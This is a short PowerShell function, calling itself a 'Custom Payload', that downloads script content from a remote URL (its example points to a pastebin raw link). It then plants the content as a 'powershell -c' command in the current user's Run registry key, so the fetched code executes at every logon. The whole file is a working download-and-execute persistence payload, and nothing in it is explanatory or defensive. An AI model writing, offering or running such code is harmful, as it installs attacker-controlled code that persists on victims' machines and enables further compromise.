function Test-Download-File-Content-Execute
{
<#
.SYNOPSIS
Custom Payload to download and execute file content from a URL as a PowerShell script.

.DESCRIPTION
This payload downloads and executes file content from a URL as a PowerShell script.

.PARAMETER URL
The URL parameter defines the file content to be downloaded and executed.

.PARAMETER RKEY_NAME
The RKEY_NAME defines the Registry key name.

.EXAMPLE
PS > Test-Download-File-Content-Execute "https://pastebin.com/raw/dLJMmDcm"

#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RKEY_NAME
    )
    # Downloads the file content
    [String] $FileContent = (New-Object System.Net.WebClient).DownloadString($URL)
    [String] $pwsCommandForm = "powershell -c '$FileContent'"
    $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
    
    # Check if it already exists a key with the given name
    if($runKeys.$RKEY_NAME){
        # Remove it if already exists
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME
    }
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME -Value $pwsCommandForm
}